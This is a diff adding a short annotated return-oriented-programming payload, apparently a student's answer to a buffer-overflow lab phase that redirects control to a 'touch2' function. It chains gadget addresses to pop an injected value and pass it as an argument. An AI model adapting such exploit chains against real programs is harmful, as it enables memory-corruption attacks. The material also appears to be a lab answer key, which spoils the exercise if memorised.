@@ -1,0 +1,14 @@
+0x00000000      0x00000000      0x00000000 0x00000000  0x00000000 
+0x00000000      0x00000000      0x00000000 0x00000000  0x00000000 
+
+0x4019ab 0x00000000 /* popq %rax with value injected */
+
+0x59b997fa
+/* 0x6054e4 no way to deref address, so hard coded here. */
+0x00000000
+
+/* move value to first argument */
+0x4019a2 0x00000000
+
+/* call touch2 */
+0x004017ec 0x00000000
